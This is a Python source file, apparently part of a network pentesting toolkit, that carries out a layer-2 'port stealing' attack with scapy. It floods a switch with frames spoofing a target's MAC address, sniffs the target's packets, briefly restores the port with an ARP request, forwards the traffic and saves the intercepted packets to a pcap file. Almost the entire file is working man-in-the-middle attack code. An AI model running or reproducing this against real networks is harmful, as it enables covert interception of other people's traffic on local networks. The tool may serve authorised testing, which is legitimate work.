from scapy.all import *
from scapy.layers.l2 import getmacbyip
from netpyntest_lib.libs import mactools
from threading import Thread

import six
import signal
import sys
import ast
from os import getpid
from os import kill
from os import devnull
from termcolor import colored

pkts = []
file = None
run = None
t = None

def signal_handler(signal, frame):
    #Save packets sniffed
    n = len(pkts)
    if n >= 1:
        wrpcap(file, pkts)
        six.print_("[*] Saving {} sniffed packets in {}".format(n, file))
    else:
        six.print_("[*] No packets sniffed. No output file will be generated.".format(n, file))

    #Stop thread
    global run
    run = False
    t.join()

    control_file=open("control_file","r+")
    data=ast.literal_eval(control_file.read()) #parsing str to dict
    #Writing a 0 to say that it's not running anymore
    data['port_stealing_pid'] = 0
    #Overwrite changes in file
    overWriteFile(control_file, str(data))
    six.print_("[*] Port Stealing STOPPED")
    #Exit
    sys.exit(0)
signal.signal(signal.SIGTERM, signal_handler)

def port_stealing_thread(mac_spoof, interface, run):
    while run():
		pkt = Ether(
			#dst = mactools.getRandomMAC(),
			src = mac_spoof
			) / IP(

			)
		sendp(pkt, verbose=False, iface=interface)


def port_stealing(ip_target, mac_target, interface):
    global run
    global t
    while True:
        #Start sending fake MAC
        run = True
        t = Thread(target=port_stealing_thread, args=(mac_target, interface, lambda: run))
        t.start()
        #Sniff a packet of the target
        pkt=sniff(count=1, filter="host " + ip_target)
        #Stop thread
        run = False
        t.join()

        #Do real ARP request and receive answer (target will recover his port)
        srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=ip_target), iface=interface, verbose=False)

        #Forward data again
        sendp(pkt, verbose=False, iface=interface)

        #Save packet captured
        if len(pkt) != 0:
            pkts.append(pkt[0])

def start(ip_target, output_file, interface):
    mac_target = getmacbyip(ip_target)
    if mac_target == None:
        six.print_(colored("[!] ERROR - Can't locate the MAC of that IP", "red"))
        exit(0)
    global file
    file=output_file
    #Access control file to  check if Port stealing is running. Write PID in file if not.
    control_file = open("control_file", "r+")
    data=ast.literal_eval(control_file.read())
    if data['port_stealing_pid'] == 0:
        data['port_stealing_pid'] = getpid()
        overWriteFile(control_file, str(data))
    else:
        six.print_(colored("[!] ERROR - Port Stealing is running", "red"))
        control_file.close()
        exit(0)
    six.print_("[*] Port Stealing STARTED")
    port_stealing(ip_target, mac_target, interface)


def stop():
    #Read data to locate process PID
    control_file=open("control_file","r+")
    data=ast.literal_eval(control_file.read()) #parsing str to dict
    pid = int(data['port_stealing_pid'])

    #If 0, means it's not running
    if pid == 0:
        six.print_(colored("[!] ERROR - No Port Stealing running", "red"))
        control_file.close()
        exit(0)
    else: #Kill process
        kill(pid, signal.SIGTERM)

    #Writing a 0 to say that it's not running
    data['port_stealing_pid'] = 0

    #Overwrite changes in file
    overWriteFile(control_file, str(data))

def overWriteFile(file, data):
    file.seek(0)
    file.write(data)
    file.truncate()
    file.close()